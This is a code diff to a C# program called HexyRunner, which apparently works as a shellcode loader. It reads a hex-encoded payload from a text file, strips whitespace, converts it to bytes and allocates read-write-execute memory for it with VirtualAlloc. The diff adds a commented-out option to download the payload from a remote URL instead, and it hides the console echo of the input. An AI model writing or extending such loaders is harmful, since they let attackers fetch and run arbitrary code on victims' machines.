@@ -1,6 +1,8 @@
 using System;
 using System.IO;
+using System.Net;
 using System.Linq;
+using System.Text.RegularExpressions;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 
@@ -28,11 +30,14 @@ namespace HexyRunner
             else {
                 string fileName = Process.GetCurrentProcess().MainModule.FileName;
                 fileName = fileName.Substring(0, fileName.LastIndexOf(".")) + ".txt";
-                input = File.ReadAllLines(fileName)[0].Trim(new char[] {'\n', '\r', '\t', ' '});
+                if (File.Exists(fileName))
+                    input = File.ReadAllLines(fileName)[0].Trim();
+            //  For download, uncomment the following two lines, and set the URL
+            //    else using (var webClient = new WebClient())
+            //        input = webClient.DownloadString("http://host/test.txt").Trim();
             }
-
-            Console.WriteLine(input);
-
+            input = Regex.Replace(input, @"\s+", string.Empty);
+            // Console.WriteLine(input);
             byte[] hexy = Str2ByteArray(input);
 
             IntPtr pointer = VirtualAlloc(IntPtr.Zero, (IntPtr) hexy.Length, (IntPtr) 0x1000, (IntPtr) 0x40);
